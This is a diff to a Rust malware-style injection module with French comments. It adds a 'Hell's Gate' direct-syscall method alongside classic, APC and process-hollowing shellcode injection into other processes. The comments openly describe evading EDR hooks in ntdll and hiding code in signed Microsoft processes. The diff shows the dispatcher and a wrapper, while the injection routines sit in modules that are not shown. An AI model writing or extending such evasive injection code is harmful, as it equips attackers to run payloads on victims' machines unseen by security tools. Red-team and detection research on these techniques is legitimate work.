@@ -6,6 +6,7 @@
 //   2. Process Hollowing          — Vider un processus légitime et y injecter le shellcode
 //   3. APC Injection              — Asynchronous Procedure Call queue injection
 //   4. DLL Hijacking              — Placer une DLL malveillante dans le chemin de recherche
+//   5. Hell's Gate (Direct Syscalls) — Bypass total des hooks EDR userland
 //
 // Chaque technique a ses avantages/inconvénients en termes de détection EDR.
 //
@@ -13,11 +14,13 @@
 //   Classic injection → CreateRemoteThread depuis ton process = IOC fort
 //   APC injection     → QueueUserAPC depuis NtTestAlert = moins visible
 //   Process Hollowing → Le code tourne dans un processus Microsoft signé
+//   Hell's Gate      → Syscalls directs, bypass total des hooks ntdll userland
 
 pub mod shellcode;
 pub mod dll_hijack;
 pub mod process_hollow;
 pub mod apc;
+pub mod hellsgate;
 
 #[cfg(target_os = "windows")]
 use std::os::windows::ffi::OsStringExt;
@@ -32,6 +35,8 @@ pub enum InjectionMethod {
     APC,
     /// Process Hollowing — shellcode dans un processus légitime
     Hollow,
+    /// Hell's Gate — Direct syscalls, bypass hooks EDR ntdll
+    HellsGate,
 }
 
 /// InjectionTarget — cible de l'injection
@@ -51,9 +56,21 @@ pub struct InjectionTarget {
 /// puis injecte le shellcode avec la méthode spécifiée.
 pub fn inject_shellcode(shellcode: &[u8], target: &InjectionTarget) -> Result<u32, String> {
     match target.method {
-        InjectionMethod::Classic => shellcode::classic_inject(shellcode, target.pid),
-        InjectionMethod::APC     => apc::apc_inject(shellcode, target.pid),
-        InjectionMethod::Hollow  => process_hollow::hollow_inject(shellcode, &target.process),
+        InjectionMethod::Classic   => shellcode::classic_inject(shellcode, target.pid),
+        InjectionMethod::APC       => apc::apc_inject(shellcode, target.pid),
+        InjectionMethod::Hollow    => process_hollow::hollow_inject(shellcode, &target.process),
+        InjectionMethod::HellsGate => hellsgate_inject_wrapper(shellcode, target.pid),
+    }
+}
+
+/// hellsgate_inject_wrapper — wrapper pour l'injection via Hell's Gate
+///
+/// Résout la syscall table dynamiquement puis injecte le shellcode
+/// sans passer par AUCUNE fonction hookée de ntdll.dll.
+fn hellsgate_inject_wrapper(shellcode: &[u8], pid: u32) -> Result<u32, String> {
+    unsafe {
+        let table = hellsgate::resolve_syscall_table()?;
+        hellsgate::hellsgate_inject(&table, shellcode, pid)
     }
 }
 
